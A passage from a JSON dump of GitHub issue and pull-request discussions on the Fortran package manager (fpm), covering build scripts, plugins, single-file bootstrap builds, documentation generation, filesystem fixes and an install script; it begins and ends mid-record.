excluded from one-way build scripts.\nA few questions that come to my mind:\n\nWhere should the build script be located within the project tree?\nShould all the environment variables consumed by the build script be prepended with FPM_?\nHow to communicate build profiles like debug or release? (Are these propagated through the compiler flags by an environment variable like FPM_FFLAGS or would we simply pass a variable called PROFILE like Cargo does)\nWhere should the archives be placed? Should it be a sub-folder in /build/<compiler>_<profile>/ meaning the build script would receive an environment variable with the output folder name? Cargo uses the variable OUT_DIR for this purpose.\nShould the \"acceptable\" build script outputs be limited to .a/.lib for C/C++/Fortran archives, .mod for Fortran modules, and .h/.hpp for C headers? Would it be acceptable to link in object files directly?"
                },
                {
                    "user": "everythingfunctional",
                    "date": "2021-04-06 00:47:10+00:00",
                    "text": "Where should the build script be located within the project tree?\n\nThe Haskell implementation assumed the top level of the project. I would initially lean towards that, but if there's a possibility that we want to support build scripts for executables and/or tests, the perhaps it should go in src-dir.\n\nShould all the environment variables consumed by the build script be prepended with FPM_?\n\nI'd have to go back to the discussion to be sure, but IIRC we were leaning towards yes.\n\nHow to communicate build profiles like debug or release? (Are these propagated through the compiler flags by an environment variable like FPM_FFLAGS or would we simply pass a variable called PROFILE like Cargo does)\n\nI would lean towards starting with just FPM_FFLAGS. I'm not sure a build script would need to now about profiles, but I'm open to being convinced.\n\nWhere should the archives be placed? Should it be a sub-folder in /build/<compiler>_<profile>/ meaning the build script would receive an environment variable with the output folder name? Cargo uses the variable OUT_DIR for this purpose.\n\nI think yes, the script receives an environment variable specifying the output folder name. I used BUILD_DIR in the Haskell implementation. I think for consistency sake it ought to be prefixed with FPM_, so my vote would be for FPM_BUILD_DIR. I think FPM_OUT_DIR is accpetable too.\n\nShould the \"acceptable\" build script outputs be limited to .a/.lib for C/C++/Fortran archives, .mod for Fortran modules, and .h/.hpp for C headers? Would it be acceptable to link in object files directly?\n\nI think it would be perfectly fine for a script to produce more outputs if it wanted too. So long as it produces the necessary library and module files for other Fortran sources to make use of it everything should be fine. Anything else produced probably shouldn't be looked at or relied upon by anything else, but I don't think that's something worth trying to enforce."
                },
                {
                    "user": "ivan-pi",
                    "date": "2021-04-06 01:02:26+00:00",
                    "text": "Where should the archives be placed? Should it be a sub-folder in /build/<compiler>_<profile>/ meaning the build script would receive an environment variable with the output folder name? Cargo uses the variable OUT_DIR for this purpose.\n\nI think yes, the script receives an environment variable specifying the output folder name. I used BUILD_DIR in the Haskell implementation. I think for consistency sake it ought to be prefixed with FPM_, so my vote would be for FPM_BUILD_DIR. I think FPM_OUT_DIR is accpetable too.\n\nBUILD_DIR sounds good too.\nWhat happens if my project depends on two packages, which export a library with the same name? Can this cause a linking problem?\nDoes the library generated by the one-way build script need to be specified manually under the link key in the [build] table?"
                },
                {
                    "user": "everythingfunctional",
                    "date": "2021-04-06 01:42:14+00:00",
                    "text": "What happens if my project depends on two packages, which export a library with the same name? Can this cause a linking problem?\nDoes the library generated by the one-way build script need to be specified manually under the link key in the [build] table?\n\nI think this is why fpm should dictate the name of the library to be produced. You already can't depend on two packages with the same name, and fpm uses the name of the package to determine the name of the library. Thus, fpm should dictate to a build script the name of the library file to be produced.\nWith the above, no, you don't need to manually specify the library under the link key in the same way your don't need to specify one for a package that doesn't have a build script. As far as users of your package are concerned, they shouldn't have to care or even know that it's built with a custom script."
                },
                {
                    "user": "ivan-pi",
                    "date": "2021-04-06 01:54:37+00:00",
                    "text": "Would this imply the convention that a simple build script only produce one library (archive)? Or are you referring here to an fpm package as it's own entity.\nConcerning your second paragraph, I was not concerned about users of the package. I know this is handled by fpm already. In my current mental model I assumed that the build script is allowed to generate any number of  lib<name>.a files. The package maintainer then adds these to the link = [\"liba\",\"libb\",\"libc\",...] section. Fpm takes care of the rest.\nAddendum: I think I understand your view. I'm guessing that in the haskell-fpm, the implicit rule was that the package and the library produced by the build script share the same basename?"
                },
                {
                    "user": "everythingfunctional",
                    "date": "2021-04-06 16:44:48+00:00",
                    "text": "For a one way build script, fpm wouldn't know that other libraries are produced. I'm guessing we're already including different build directories as include locations in the link commands, so manually adding those additional libraries to the link works, but I'm not sure it was intended to.\nI would argue that a package that produces more than one library should be split into separate packages. I'd say we shouldn't focus any effort trying to explicitly support packages that want to produce multiple library files. You're solution is a perfectly valid workaround (if not explicitly supported), and so we shouldn't try to prevent it, just say it's not guaranteed to be reliable."
                },
                {
                    "user": "zoziha",
                    "date": "2021-05-31 11:16:29+00:00",
                    "text": "The one-way build script is expected to receive inputs via environment variables, and place the compiled libraries in the correct location.\n\nI have a good idea, it should be able to use different make tools, such as make, cmake.\n\nI think the make tool generally only displays simple commands, such as make build and cmake build. Obviously, these are commands and we need to deal with them. They are more like coherent tasks\u2728 besides static commands.\nUse the binary files generated by the make tool, such as link libraries and intermediate .obj files. Only the make tool and developers know where they are generated.\n\nBased on the above analysis, we can add items like [make] to fpm.toml:\n[package]\nname = \"fpm-make-test\"\n\n[make]\n[make.tasks.src]\ndescription = \"Generate src_dir objs.\"\ncommand = \"make\"\nargs = [\"-f\", \"makefile\", \"--directory=src\"]\nkind = \"objs\"     # shared/static/objs/binary\nobjs_dir = [\"./build/objs/src1/\", \n            \"./build/objs/src2/\",\n            ...\n]\n\n[make.tasks.others]\n...\nWe use fpm's absolute control over fpm.toml to control the commands of the make tool and the path of the generated binary file. fpm selects the behavior of fpm by extracting the path of the generated binary file.\nWe leave this [make] to the developer to consider. fpm just sends make commands and accepts task results.\nMy inspiration comes from:\n\nhttps://medium.com/@sagiegurari/automating-your-rust-workflows-with-cargo-make-part-1-of-5-introduction-and-basics-b19ced7e7057\nhttps://github.com/sagiegurari/cargo-make\n\n(also see #118 (comment))"
                }
            ]
        },
        {
            "number": 218,
            "user": "LKedward",
            "date": "2020-10-28 10:36:28+00:00",
            "title": "Add binary releases from latest master using CI",
            "text": "See here for minimal demo which produces these github releases. I will open a cleaned-up PR in coming days.",
            "comments": []
        },
        {
            "number": 217,
            "user": "LKedward",
            "date": "2020-10-28 10:10:08+00:00",
            "title": "Implement static library archiving",
            "text": "In order to match bootstrap version and reduce the size of compiled binaries where possible.",
            "comments": []
        },
        {
            "number": 216,
            "user": "rouson",
            "date": "2020-10-27 19:32:47+00:00",
            "title": "Remove bashism from install.sh",
            "text": "/bin/sh doesn't allow double square brackets so this pull request switches to single brackets",
            "comments": []
        },
        {
            "number": 214,
            "user": "awvwgk",
            "date": "2020-10-26 15:35:23+00:00",
            "title": "Dealing with packages using a non-standard layout",
            "text": "fpm currently assumes that the fpm.toml is in the repository root. The most notable example where this is not the case is Fortran fpm itself. Should there be a way to specify the location of the fpm.toml file when fetching a dependency or project?\nThe alternative is to fix this for Fortran fpm and ignore this case for now.",
            "comments": [
                {
                    "user": "everythingfunctional",
                    "date": "2020-10-26 18:34:46+00:00",
                    "text": "I'm not opposed to the idea of letting the fpm.toml file be in a different place (or even have a different name) in theory, but how would a package specify that? The most natural place would be ... in the fpm.toml file, but that doesn't quite work. The other option would be in some sort of metadata with the packages information in the registry. That wouldn't really help \"unpublished\" packages though. I don't think you'd want to require users of your package to specify it in their fpm.toml file, because that's something that would be subject to change and would break your users. Maybe that's not totally unacceptable though, since you'd have to publish a new version to change it anyway. Just some thoughts."
                },
                {
                    "user": "certik",
                    "date": "2020-10-26 20:17:25+00:00",
                    "text": "I think the fpm package should eventually move to having fpm.toml in the root. Alternatively, we can follow \"cargo workspaces\": https://doc.rust-lang.org/book/ch14-03-cargo-workspaces.html"
                }
            ]
        },
        {
            "number": 213,
            "user": "everythingfunctional",
            "date": "2020-10-22 19:01:15+00:00",
            "title": "Bootstrap submodule support",
            "text": "This implements support for submodules in the Haskell (bootstrap) version of fpm. A quick note that this removes any requirements or restrictions on naming conventions for modules and source files. Those could in theory be added back in as explicit checks somewhere.\nAdditionally, this should now work with multiple programs in the same folder. I haven't really tested that yet, but it should work.",
            "comments": [
                {
                    "user": "everythingfunctional",
                    "date": "2020-10-22 21:46:28+00:00",
                    "text": "There are binary files checked into this branch, (several object files, some submodule files and an archive). Those should be removed from the commit history.\n\nNot sure how I missed that. Fixed."
                },
                {
                    "user": "certik",
                    "date": "2020-10-23 16:35:45+00:00",
                    "text": "Great work, thank you.\nWhy were tests moved out of the tests directory directly into top level? I would like to have a tests directory I think.\nIn general, the PR would be a lot easier to review if such unrelated changes were not done in the same PR.\nConsequently, I hope I didn't miss it, it seems there is no test for submodules in the (no removed) tests directory. I think there might be a test for this in the Haskell version, but I think we should strive for providing tests in the tests directory, so that the Fortran version can reuse them."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-10-23 17:45:14+00:00",
                    "text": "@certik , I moved the examples out of the tests folder, because I thought it strange that they were in the fpm/tests folder, but were still used (and in fact there was a softlink) by the bootstrap version. Also, I find the examples as useful for more than just testing the code; they are examples of how one might organize their own projects to work with fpm, and should thus be much more prominently available (i.e. at the top level). We could put a softlink in the tests folder if you like."
                },
                {
                    "user": "LKedward",
                    "date": "2020-10-24 09:32:24+00:00",
                    "text": "The example packages are more useful as demonstrations of the capabilities of fpm to potential and existing users/developers than as actual tests. We need them currently for end-to-end regression testing but their usefulness to identify bugs or general regressions is quite limited."
                },
                {
                    "user": "certik",
                    "date": "2020-10-24 15:02:01+00:00",
                    "text": "It's useful to have examples, no doubt. But more importantly we need tests. I thought these were a good start. How should our testsuite look like?\n\u2026\nOn Sat, Oct 24, 2020, at 3:32 AM, Laurence Kedward wrote:\n\n\n The example packages are more useful as demonstrations of the\n capabilities of fpm to potential and existing users/developers than as\n actual tests. We need them currently for end-to-end regression testing\n but their usefulness to identify bugs or general regressions is quite\n limited.\n\n \u2014\n You are receiving this because you were mentioned.\n Reply to this email directly, view it on GitHub\n <#213 (comment)>,\n or unsubscribe\n <https://github.com/notifications/unsubscribe-auth/AAAFAWHVVXOXRFLUUPBWY2DSMKNLJANCNFSM4S3TGKWA>."
                },
                {
                    "user": "LKedward",
                    "date": "2020-10-26 09:27:12+00:00",
                    "text": "It's useful to have examples, no doubt. But more importantly we need tests. I thought these were a good start. How should our testsuite look like?\n\nYes, I certainly didn't mean to imply that examples are more important than tests. Rather, I want to point out that we already have a fairly comprehensive set of unit tests which give much better code coverage and diagnostic capability than building the example packages (though I agree that we absolutely still need to do this for end-to-end and regression testing).\n\n\nI would like to have a tests directory I think.\n\nThe reason this test directory isn't in the root directory is because fortran fpm is in a sub-directory -  this doesn't need to be the case. Indeed, fpm assumes other fpm packages exist in the top-level directory, why should fpm be any different? We can still keep the bootstrap version separate in a sub-directory."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-10-26 15:14:56+00:00",
                    "text": "Glad you guys are happy with the new functionality. Is there anything more you would like done in this PR before merging in?"
                },
                {
                    "user": "LKedward",
                    "date": "2020-10-26 16:39:13+00:00",
                    "text": "+1 to merge from me!"
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-10-26 22:16:36+00:00",
                    "text": "Ok, with 3 approvals I'm going to go ahead and merge. Feel free to create an issue and tag me if you'd like additional changes after."
                }
            ]
        },
        {
            "number": 212,
            "user": "LKedward",
            "date": "2020-10-20 16:47:36+00:00",
            "title": "Implement incremental rebuild",
            "text": "(Rebuild only when source/dependencies modified.)\nI've made a start on this, so creating an issue to assign.",
            "comments": []
        },
        {
            "number": 211,
            "user": "awvwgk",
            "date": "2020-10-20 08:24:28+00:00",
            "title": "Customizing fpm with plugins",
            "text": "For commands like fpm doc or fpm fmt the available pool of tools is quite large and heterogeneous, if we want to support such functionality it must allow some kind of customization\nA non-comprehensive list of tools for fpm doc:\n\ndoxygen\n\nrequires Doxyfile as input\n\n\nford\n\nmarkdown file with yaml header as input, can have any name\n\n\nufpp\n\nactually a preprocessor which can also extract documentation\n\n\n\nFor fpm fmt:\n\nlfortran fmt\n\nactually an LLVM compiler + formatting\n\n\nfindent\n\ncan only take stdin and only writes to stdout\n\n\nfprettify\n\ncan recursively run over the source tree\n\n\n\nAll of those tools come with specific requirements and limitations. Also, I doubt there would be a perfect choice we could all agree on for those functionalities. One possibility is to collect all common tools and add native support for them in fpm, which might be cumbersome and if one has a personal set of tools for this task, they cannot use it with fpm in an automated way.\nMy proposal it to allow defining those functions as \u201cplugins\u201d instead:\n[plugin]\n[plugin.fmt]  # Adds `fmt` command to fpm\nprogram = \"lfortran\"\n# Special variables like @INPUT@ and @OUTPUT@ are replaced by the filenames\ncommand = [\"fmt\", \"--no-color\", \"@INPUT@\"]\n# Standard input and standard output can be captured if necessary \noutput.capture = true\n# Probably needs a better way to define the interaction with the source...\nscope = [\"src/\", \"app/\"]\nThose could be defined locally in a fpm.toml, globally in a .fpmrc.toml or fetched like any other package. Note that installing the actual tool would be in many cases beyond the scope of fpm.",
            "comments": [
                {
                    "user": "LKedward",
                    "date": "2020-10-20 09:44:04+00:00",
                    "text": "I like this idea of plugins to keep things modular but extensible. This will allow the fpm codebase to remain focused and robust. Regarding plugins, it would be good if they could be fetched like other packages to simplify the workflow."
                },
                {
                    "user": "certik",
                    "date": "2020-12-17 19:44:51+00:00",
                    "text": "Copying my text from #313, which I am closing in favor of this issue:\nThis was first mentioned here:\n#309 (reply in thread)\nThe idea is that people are already writing many 3rd party tools for everything from formatting, automatic documentation lookups, pre-processors, etc. Many of these tools require to understand the structure of the project, which fpm knows and can provide to them, so that lfortran fmt can format your whole project, it would get the list of files from fpm.\nIt could go the other way too, so that fman can register a new command fpm man, which would look up things, or lfortran can register fpm fmt. Similar to how git can be extended by simply providing a tool git-something in a $PATH and git something becomes available.\nThe way various Jupyter kernels register with jupyter is that they simply create a file in $PREFIX/share/jupyter/kernels/fortran/kernel.json, which creates a fortran kernel. So in the same way, fman can install a file $PREFIX/share/fpm/plugins/fman/plugin.json which has information where to find fman and anything else needed for fpm to be able to call it. The way this works with Jupyter is that you just install lfortran (say using conda install lfortran) and it will automatically appear in Jupyter as an optional kernel, users do not have to do anything, it just works.\nLet's brainstorm this more."
                }
            ]
        },
        {
            "number": 210,
            "user": "urbanjost",
            "date": "2020-10-18 22:26:06+00:00",
            "title": "suggestion for a --bootstrap option on the fpm build subcommand",
            "text": "Sometimes you want a standalone single source file for an application. A pure Fortran project is particularly amenable  to that. It can be needed for a variety of reasons from optimizing inlining to debugging to bootstrapping on another platform. A simple trick when you have a makefile to build a project is to use a script for compiling and have an option for the compiler to become a simple copy of the source file to stdout (usually after expanding INCLUDE files and preprocessor directives). Since fpm(1) is a source package manager\nit could easily generate a file list at a minimum, and certainly a Makefile if nothing else. Just curious if that sounds worthwhile.  If you do something like that with f-fpm you get a single Fortran file that bootstraps (at least at the moment) except for having to change \"include_\" to \"inc_\" to handle a a known issue. It was nice to be able to try f-fpm even as is on a machine without h-fpm and haskell. Just needed a Fortran compiler and a single file.  So just changing the program to list the filenames instead of compiling them and a few shell commands gave\n# output of files built from a full build\ncat \\\n./src/fpm_environment.f90 \\\n./src/fpm_strings.f90 \\\n./src/fpm_filesystem.f90 \\\n./src/fpm_model.f90 \\\n./src/fpm_backend.f90 \\\n./src/fpm/error.f90 \\\n./src/fpm/git.f90 \\\n./build/dependencies/toml-f/src/tomlf/constants.f90 \\\n./build/dependencies/toml-f/src/tomlf/error.f90 \\\n./build/dependencies/toml-f/src/tomlf/datetime.f90 \\\n./build/dependencies/toml-f/src/tomlf/utils/verify.f90 \\\n./build/dependencies/toml-f/src/tomlf/utils/convert.f90 \\\n./build/dependencies/toml-f/src/tomlf/utils.f90 \\\n./build/dependencies/toml-f/src/tomlf/type/value.f90 \\\n./build/dependencies/toml-f/src/tomlf/structure/base.f90 \\\n./build/dependencies/toml-f/src/tomlf/structure/vector.f90 \\\n./build/dependencies/toml-f/src/tomlf/structure.f90 \\\n./build/dependencies/toml-f/src/tomlf/type/array.f90 \\\n./build/dependencies/toml-f/src/tomlf/type/keyval.f90 \\\n./build/dependencies/toml-f/src/tomlf/type/table.f90 \\\n./build/dependencies/toml-f/src/tomlf/type.f90 \\\n./build/dependencies/toml-f/src/tomlf/build/keyval.f90 \\\n./build/dependencies/toml-f/src/tomlf/build/array.f90 \\\n./build/dependencies/toml-f/src/tomlf/build/table.f90 \\\n./build/dependencies/toml-f/src/tomlf/build.f90 \\\n./build/dependencies/toml-f/src/tomlf/de/tokenizer.f90 \\\n./build/dependencies/toml-f/src/tomlf/de/character.f90 \\\n./build/dependencies/toml-f/src/tomlf/de.f90 \\\n./build/dependencies/toml-f/src/tomlf/ser.f90 \\\n./build/dependencies/toml-f/src/tomlf/version.f90 \\\n./build/dependencies/toml-f/src/tomlf.f90 \\\n./src/fpm/toml.f90 \\\n./src/fpm/manifest/dependency.f90 \\\n./src/fpm/manifest/executable.f90 \\\n./src/fpm_sources.f90 \\\n./build/dependencies/M_CLI2/src/M_CLI2.f90 \\\n./build/dependencies/fortran-intrinsic-manpages/src/M_intrinsics.f90 \\\n./src/fpm_command_line.f90 \\\n./src/fpm/manifest/build_config.f90 \\\n./src/fpm/manifest/library.f90 \\\n./src/fpm/manifest/test.f90 \\\n./src/fpm/versioning.f90 \\\n./src/fpm/manifest/package.f90 \\\n./src/fpm/manifest.f90 \\\n./src/fpm.f90 \\\n./src/fpm/cmd/new.f90 \\\n./build/dependencies/toml-f/src/tomlf/all.f90 \\\n./app/main.f90 \\\n> ffpm.f08\nreplace include_ inc_ -- ffpm.f08\nmkdir /tmp/scratch\ngfortran ffpm.f08 -J /tmp/scratch -o ffpm.exe\nexit\n\nThis was run on a machine that did have h-fpm on it so the dependency files were available and then that single file was moved to a machine with just a fortran compiler and it built and ran; albeit the version I used does not get remote dependencies and so on yet.\nI was thinking even it was not to be a general feature it might be useful for maintaining a bootstrappable fpm(1) command in the future.",
            "comments": [
                {
                    "user": "ivan-pi",
                    "date": "2020-10-18 23:02:34+00:00",
                    "text": "This is roughly related to #69 where it was suggested to have a backend which can emit a makefile.\nIn principle this could carry over directly to bootstrap fpm on a computer platform with restricted access."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-10-19 15:37:27+00:00",
                    "text": "My initial inclination for producing a \"source code release\" (or bootstrap version) was to put all of the necessary source files and a Makefile into a tarbal, but just combining them all into a single source file is supported by the Fortran language, and could thus be simpler. Not a bad idea. (Note that I think order likely still matters to many compilers.)"
                },
                {
                    "user": "certik",
                    "date": "2020-10-19 15:49:17+00:00",
                    "text": "I think this is almost a duplicate of #123. The only difference is that here everything is put into just one file, while #123 is to create a tarball.\nEither way, I think the answer is yes, we want that."
                },
                {
                    "user": "ivan-pi",
                    "date": "2020-10-19 17:19:36+00:00",
                    "text": "My initial inclination for producing a \"source code release\" (or bootstrap version) was to put all of the necessary source files and a Makefile into a tarbal, but just combining them all into a single source file is supported by the Fortran language, and could thus be simpler. Not a bad idea. (Note that I think order likely still matters to many compilers.)\n\nI guess this can only be done for pure Fortran projects without mixed language dependencies. If C code is somehow used, then a tarball is needed."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-10-20 00:51:55+00:00",
                    "text": "The files were listed in their dependency order not just as a list so I do not know of a compiler that cannot build it with no other requirements -- CMake, make, ... . I have done that for a long time. I think this is similar enough to the others that I will close it. One of the more interesting things about the Fortran features that support a single-file build is that many compilers are much better at optimizing such a file, catching programming errors, and debugging and profiling the program. I have seen large programs reduce their wallclock times by 20% just by being compiled in a single file. There use to be larger gains possible but compilers have gotten better over the years(so it was often already optimizing even though compiled in seperate compilations).  The compiler that produced the least gains when doing this has generally been the Cray compiler which had delayed inlining capabilities. Some compilers used to fail if the file was too large but I have not seen that in some time. With that exception the better the compiler is at optimizing the more gains this produced in the recent past. Have not tried this lately with codes > 300 000, lines but I probably will soon just to see what numbers it produces with a few different compilers. The biggest gains I have seen often involved inlining and I am not sure how well the compilers handle that now that modules are much more common."
                },
                {
                    "user": "LKedward",
                    "date": "2020-10-20 09:42:14+00:00",
                    "text": "I believe the current --list option does not list file in a suitable build order, but I can easily incorporate this into the existing backend to do so.\n\nI know of CFD codes where the production code is still compiled in a single compilation unit to maximise inter-procedural optimization. I think nowadays the potential gains are less. Most compilers also now have link-time optimization, which is essentially the same as single unit compilation but with some parsing/processing done beforehand. This is something I want to benchmark at some point, to see the difference between separate compilation, LTO and single-unit compilation. I seem to think that it has a big effect for operator overloading, but I can't find a reference atm. I still perform a single-unit compilation for intensive programs to check that some significant IPO isn't being left out somewhere due to program structure."
                }
            ]
        },
        {
            "number": 209,
            "user": "awvwgk",
            "date": "2020-10-17 11:06:12+00:00",
            "title": "Add automatic documentation for Fortran fpm",
            "text": "create docs.md as input for FORD\nfix docstrings and comment style for FORD\n\nTODO:\n\ndeploy to fortran-lang.org website (separate PR)\nreport bugs to FORD upstream: [[executables]] will always be interpreted as links even in literal code blocks",
            "comments": [
                {
                    "user": "awvwgk",
                    "date": "2020-10-17 11:20:25+00:00",
                    "text": "https://github.com/Fortran-FOSS-Programmers/ford seems like the correct upstream for FORD, but the project looks discontinued. If this is the case, we probably have to workaround the bug ourselves or make an attempt to resume the maintenance of FORD."
                },
                {
                    "user": "LKedward",
                    "date": "2020-11-04 15:09:39+00:00",
                    "text": "@awvwgk are you able to resolve the conflicts here and perhaps include the new manifest-reference in with the docs. After that I think it's ready to merge."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-11-04 16:22:54+00:00",
                    "text": "For reference, about the current status of FORD: Fortran-FOSS-Programmers/ford#317.\nUsing FORD for fpm will currently require some ugly fixes since the TOML array of tables will clash with the cross reference syntax. This might be a blocker for this PR until I figure a good way out to work around this issue. The respective bug is described here: Fortran-FOSS-Programmers/ford#309."
                },
                {
                    "user": "LKedward",
                    "date": "2020-11-05 09:26:34+00:00",
                    "text": "This might be a blocker for this PR until I figure a good way out to work around this issue.\n\nIs 8030941 a sufficient workaround to merge this?"
                },
                {
                    "user": "awvwgk",
                    "date": "2020-11-05 10:26:24+00:00",
                    "text": "@LKedward Yes, it fixes it by introducing whitespace around the header of the array of tables. It looks ugly in my opinion but is still valid TOML, so if everyone is fine with this solution we can go ahead and merge.\n-[[executable]]\n+[[ executable ]]"
                },
                {
                    "user": "LKedward",
                    "date": "2020-11-05 11:06:50+00:00",
                    "text": "Yep, I'm happy with that solution. Having some kind of internal API documentation for developers plus specifications and user documentation on the web is important IMO."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-11-10 13:14:49+00:00",
                    "text": "I'll go ahead and merge this PR later today."
                }
            ]
        },
        {
            "number": 208,
            "user": "LKedward",
            "date": "2020-10-17 10:58:30+00:00",
            "title": "Minor fixes: to list_files and mkdir in fpm_filesystem",
            "text": "As identified by @urbanjost, there are inconsistencies in the behaviour of our mkdir and list_files filesystem routines on Windows and Linux.\nPR implements the following fixes:\n\nmkdir will not fail if dir already exists;\nlist_files will include hidden files but exclude '.' and '..'",
            "comments": [
                {
                    "user": "milancurcic",
                    "date": "2020-10-26 21:13:23+00:00",
                    "text": "Bump. Let's get one more review here before merging."
                },
                {
                    "user": "interkosmos",
                    "date": "2020-10-26 21:21:02+00:00",
                    "text": "Looks fine."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-10-26 21:25:39+00:00",
                    "text": "Thank you! Will merge."
                }
            ]
        },
        {
            "number": 207,
            "user": "urbanjost",
            "date": "2020-10-15 23:01:50+00:00",
            "title": "Errata",
            "text": "Errata in some markdown files",
            "comments": [
                {
                    "user": "LKedward",
                    "date": "2020-10-16 15:53:16+00:00",
                    "text": "@urbanjost, I'm having trouble running the new_test test on my machine (Ubuntu 18.0, gfortran 7.5.0 & gfortran 10.1.0) - the check for expected filenames is failing (see output below). I've taken a look at the test code and I believe the allocatable character(:) array fnames is causing problems. I would suggest greatly simplifying this check along the lines of:\ncall list_files(trim(directories(i)), file_names,recurse=.true.)\ndo j=1,size(expected)\n  if( .not.(trim(expected(j)).in.file_names) )then\n    tally=[tally,.false.]\n    write(*,'(\"ERROR: FOUND \",*(g0:,\", \"))')( trim(file_names(k)%s), k=1,size(file_names) )\n    write(*,'(*(g0))')'       BUT NO MATCH FOR ',expected(j)\n    cycle TESTS\n  endif\nenddo\n\n>>>DIRECTORY A:   A/app, A/fpm.toml, A/README.md, A/src, A/test, A/app/main.f90, A/src/A.f90, A/test/main.f90\nERROR: EXPECTED A/app, A/fpm.toml, A/README.md, A/src, A/test, A/app/main.f90, A/src/A.f90, A/test/main.f90\n       NO MATCH FOR A/appA/fpmAA/fA                   \n>>>DIRECTORY B:   B/fpm.toml, B/README.md, B/src, B/src/B.f90                             \nERROR: EXPECTED B/fpm.toml, B/README.md, B/src, B/src/B.f90\n       NO MATCH FOR B/fpm.tomlB       \n>>>DIRECTORY C:   C/app, C/fpm.toml, C/README.md, C/app/main.f90\nERROR: EXPECTED C/app, C/fpm.toml, C/README.md, C/app/main.f90\n       NO MATCH FOR C/appC/fpmCC/f                  \n>>>DIRECTORY D:   D/fpm.toml, D/README.md, D/test, D/test/main.f90\nERROR: EXPECTED D/fpm.toml, D/README.md, D/test, D/test/main.f90\n       NO MATCH FOR D/fpm.tomlDD/RE                    \n>>>DIRECTORY E:   E/fpm.toml, E/README.md, E/src, E/test, E/src/E.f90, E/test/main.f90\nERROR: EXPECTED E/fpm.toml, E/README.md, E/src, E/test, E/src/E.f90, E/test/main.f90\n       NO MATCH FOR E/fpm.tomlEE/RE                              \n>>>DIRECTORY F:   F/app, F/fpm.toml, F/README.md, F/src, F/app/main.f90, F/src/F.f90\nERROR: EXPECTED F/app, F/fpm.toml, F/README.md, F/src, F/app/main.f90, F/src/F.f90\n       NO MATCH FOR F/appF/fpmFF/f                                                       \n>>>DIRECTORY G:   corrupted size vs. prev_size"
                },
                {
                    "user": "LKedward",
                    "date": "2020-10-16 16:34:04+00:00",
                    "text": "Thanks @urbanjost, the CLI has come together really nicely - the help texts are great and I love the new intrinsics help feature!\nThe changes to fpm new all seem good when tested locally.\nI've done a brief look through and left a few preliminary comments (please also see my comment about new_test).\nPlease sync with master when you get a chance to make it easier to review the unique changes here."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-10-16 17:52:04+00:00",
                    "text": "OK. I will pull and re-sync.  I suspect I will have a few questions about github in the process. Ultimately, not to throw too big a monkey wrench into the mix I am picturing that once the core f-fpm is fully functional that the fortran documentation, a Fortran formatter, maybe a pre-processor, a translator to make/Cmake and other utilities will be available as something like fpm --addtool NAME and will be separate executables that can be added (and updated) individually. I actually have a little program that evolved out of making a test case for a module to do with ANIS color escape sequences that tries to use the same logic as the txt2man(1) script to colourize the intrinsic documents called \"bully\" (for bulletin)  Just a concept but that is for another day. I know the colour choice is questionable, but a preliminary sample looks like:\n\nThanks for moving this forward."
                }
            ]
        },
        {
            "number": 206,
            "user": "rouson",
            "date": "2020-10-13 18:42:18+00:00",
            "title": "Add installation script in install.sh",
            "text": "",
            "comments": [
                {
                    "user": "certik",
                    "date": "2020-10-13 19:03:15+00:00",
                    "text": "Thanks @rouson for sending it. I think this only works on Linux?"
                },
                {
                    "user": "rouson",
                    "date": "2020-10-13 19:21:10+00:00",
                    "text": "@certik it was developed on macOS.  The goal will be for it to also work on Linux (I'll test it on Lubuntu) and on the Windows Subsystem for Linux (which I'll eventually test too but I'm not sure of the timeline as I need to purchase Windows).  Also, this first version is skeletal.  Over time, I'll attempt to make it more robust and add features.  For example, I'll add\n\n--help flag\nthe option to specify an install path\nuse of sudo for installation paths that require it\n\nIf you have other requested features, let me know and feel free to submit issues.\nIn theory, I can borrow a lot from the OpenCoarrays installer, but that installer is written in bash 3 because it was the default macOS shell until recently.  Now the default macOS shell is zsh and @everythingfunctional explained to me that the default on Linux is dash, of which I never heard until yesterday.  If possible, I'll go with dash because it's POSIX-compliant, but that depends on how much I'm able to borrow or convert from the OpenCoarrays installer.  It also depends on whether one can expect to find dash preinstalled on most platforms across each of the aforementioned operating systems."
                },
                {
                    "user": "certik",
                    "date": "2020-10-13 20:05:31+00:00",
                    "text": "I am not against having this. I just don't want you to spend too much time if it doesn't end up being used that much. Once the Fortran version of fpm can bootstrap itself, I honestly think the easiest way to distribute it to end users is using:\n\nnative package managers (Conda, spack, apt-get, brew, winget, ...)\nusing a tarball with a cmake build system that only requires a Fortran compiler and cmake (#123).\n\nBut if you think this script makes it easier for you and others, please go ahead. I think we should also be testing this at our CI to ensure it keeps working."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-10-13 20:30:10+00:00",
                    "text": "In theory, this script should work in any POSIX environment, but I'm not sure how well stack's installer works in all environments. So, it should work on any Linux distro, MacOS, WSL, Cygwin, and probably some others.\nWhat would the CI test for this be? Just run it? I think it's probably sufficient, but there's no way we'll find issues more often than the users for this."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-10-13 20:41:32+00:00",
                    "text": "I'm not sure if it is necessary to install stack with the haskell-stack installer at all. I would in fact strongly advice against it, because it will mess up with the native package manager.\nA short look on the availability of stack across platforms and distros at https://repology.org/project/haskell:stack/versions shows a surprisingly good coverage. I see at least two ways to install on OSX and one Windows package there. Also stack is readily available on conda-forge for all major platforms: https://github.com/conda-forge/stack-feedstock."
                },
                {
                    "user": "rouson",
                    "date": "2020-10-13 22:04:33+00:00",
                    "text": "@certik to explain the motivation further, I found with OpenCoarrays that\n\nDownloads increased considerably after we added the installer.\nVarious subsets of users have different, non-overlapping installation preferences. A script can capture different approaches with various flags.  For example, @awvwgk prefers installing stack differently.\n\nFor every person who will read documentation and install prerequisites separately, I suspect there are multiple people who will go away silently.  Even just for my own purposes, I like having scripts so I don't have to (re)read the documentation to (re)install."
                },
                {
                    "user": "certik",
                    "date": "2020-10-14 00:22:12+00:00",
